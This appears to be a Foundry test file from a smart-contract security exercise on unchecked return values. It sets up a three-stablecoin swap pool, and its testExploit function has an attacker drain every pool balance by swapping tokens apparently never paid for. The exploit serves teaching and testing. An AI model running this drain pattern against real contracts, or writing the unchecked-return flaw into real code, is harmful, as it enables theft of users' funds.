// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../../src/14. Unchecked Returns-3/USDC.sol";
import "../../src/14. Unchecked Returns-3/UST.sol";
import "../../src/14. Unchecked Returns-3/DAI.sol";
//import "../../src/14. Unchecked Returns-3/StableSwap.sol";
import "../../src/14. Unchecked Returns-3/StableSwapSecured.sol";

contract TestUR3 is Test {
    USDC usdc;
    UST ust;
    DAI dai;
    StableSwap stableSwap;

    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");

    uint256 constant TOKENS_INITIAL_SUPPLY = 100_000_000e6;
    uint256 constant TOKENS_IN_STABLESWAP = 1_000_000e6;

    uint256 constant CHAIN_ID = 31337;

    uint256 stableSwapUSTBalance;
    uint256 stableSwapUSDCBalance;
    uint256 stableSwapDAIBalance;

    function setUp() public {
        // Deploy Tokens
        // Deploy UST
        vm.startPrank(deployer);
        ust = new UST(TOKENS_INITIAL_SUPPLY, "Terra USD", "UST", 6);

        // Deploy USDC
        usdc = new USDC();
        usdc.initialize("Center Coin", "USDC", "USDC", 6, deployer, deployer, deployer, deployer);

        // Deploy DAI
        dai = new DAI(CHAIN_ID);

        // Mint Tokens to Deployer
        dai.mint(deployer, TOKENS_INITIAL_SUPPLY);
        usdc.configureMinter(deployer, TOKENS_INITIAL_SUPPLY);
        usdc.mint(deployer, TOKENS_INITIAL_SUPPLY);

        // Deploy StableSwap
        address[] memory tokens = new address[](3);
        tokens[0] = address(ust);
        tokens[1] = address(usdc);
        tokens[2] = address(dai);
        stableSwap = new StableSwap(tokens);

        // Check allowed tokens
        assertEq(stableSwap.isSupported(address(usdc), address(dai)), true);
        assertEq(stableSwap.isSupported(address(dai), address(ust)), true);
        assertEq(stableSwap.isSupported(address(ust), address(usdc)), true);

        // Send tokens to StableSwap
        ust.transfer(address(stableSwap), TOKENS_IN_STABLESWAP);
        usdc.transfer(address(stableSwap), TOKENS_IN_STABLESWAP);
        dai.transfer(address(stableSwap), TOKENS_IN_STABLESWAP);

        // Check StableSwap balances
        assertEq(ust.balanceOf(address(stableSwap)), TOKENS_IN_STABLESWAP);
        assertEq(usdc.balanceOf(address(stableSwap)), TOKENS_IN_STABLESWAP);
        assertEq(dai.balanceOf(address(stableSwap)), TOKENS_IN_STABLESWAP);

        // Swap works, balances are ok
        uint256 amount = 100e6;
        usdc.approve(address(stableSwap), amount);
        stableSwap.swap(address(usdc), address(dai), amount);
        assertEq(usdc.balanceOf(address(stableSwap)), TOKENS_IN_STABLESWAP + amount);
        assertEq(dai.balanceOf(address(stableSwap)), TOKENS_IN_STABLESWAP - amount);

        // Swap fails without approval
        vm.expectRevert();
        stableSwap.swap(address(usdc), address(dai), amount);

        stableSwapUSTBalance = ust.balanceOf(address(stableSwap));
        stableSwapUSDCBalance = usdc.balanceOf(address(stableSwap));
        stableSwapDAIBalance = dai.balanceOf(address(stableSwap));
    }

    function testExploit() public {
        /**
         * EXPLOIT START
         */
        vm.startPrank(attacker);
        stableSwap.swap(address(ust), address(dai), stableSwapDAIBalance);
        stableSwap.swap(address(ust), address(usdc), stableSwapUSDCBalance);
        stableSwap.swap(address(ust), address(ust), stableSwapUSTBalance);

        /**
         * SUCCESS CONDITIONS
         */
        // Attacker was able to drain all funds from StableSwap
        assertEq(ust.balanceOf(address(stableSwap)), 0);
        assertEq(usdc.balanceOf(address(stableSwap)), 0);
        assertEq(dai.balanceOf(address(stableSwap)), 0);

        assertEq(ust.balanceOf(attacker), stableSwapUSTBalance);
        assertEq(usdc.balanceOf(attacker), stableSwapUSDCBalance);
        assertEq(dai.balanceOf(attacker), stableSwapDAIBalance);
    }
}
